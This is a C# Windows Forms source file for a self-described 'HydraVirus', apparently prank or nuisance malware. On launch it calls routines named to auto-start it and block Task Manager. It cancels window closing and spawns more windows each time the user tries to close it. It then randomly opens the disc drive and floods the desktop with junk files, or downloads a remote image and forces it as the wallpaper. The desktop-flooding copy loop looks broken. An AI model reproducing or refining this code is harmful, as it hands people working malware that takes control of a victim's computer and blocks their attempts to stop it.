using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static HydraVirus.WallpaperMgr;

namespace HydraVirus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Payload Payload = new Payload();

            Payload.AutoStart();
            Payload.BlockTaskMgr();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Form2 frm2 = new Form2();
            frm2.Show();
            Form3 frm3 = new Form3();
            frm3.Show();
            Form4 frm4 = new Form4();
            frm4.Show();

            new Thread(() =>
            {
                RandomPayload();
            }).Start();
        }

        public void RandomPayload()
        {
            WallpaperMgr WallpaperMgr = new WallpaperMgr();
            Payload Payload = new Payload();

            Random rnd = new Random();
            int x = rnd.Next(1, 3);
            switch (x)
            {
                case 1:
                    Payload.OpenDisck();
                    string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    File.WriteAllText(desktop_files + @"\HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus.txt", "HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_");
                    try
                    {
                        for (int i = 1; i < 300; i++)
                        {
                            File.Copy(desktop_files + @"\HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus_HydraVirus.txt", desktop_files + $"\\");
                        }
                    }
                    catch (Exception ex) { }
                    break;

                case 2:
                    Payload.OpenDisck();
                    try
                    {
                        string result = Path.GetTempPath();
                        using (WebClient webClient = new WebClient())
                        {
                            webClient.DownloadFile("https://wallpaperaccess.com/full/844221.jpg", string.Format(result + "\\844221.jpg", Guid.NewGuid().ToString()));
                        }
                        Set(result + "\\844221.jpg", Style.Stretched);
                    }
                    catch(Exception ex) { }
                    break;
            }
        }
    }
}
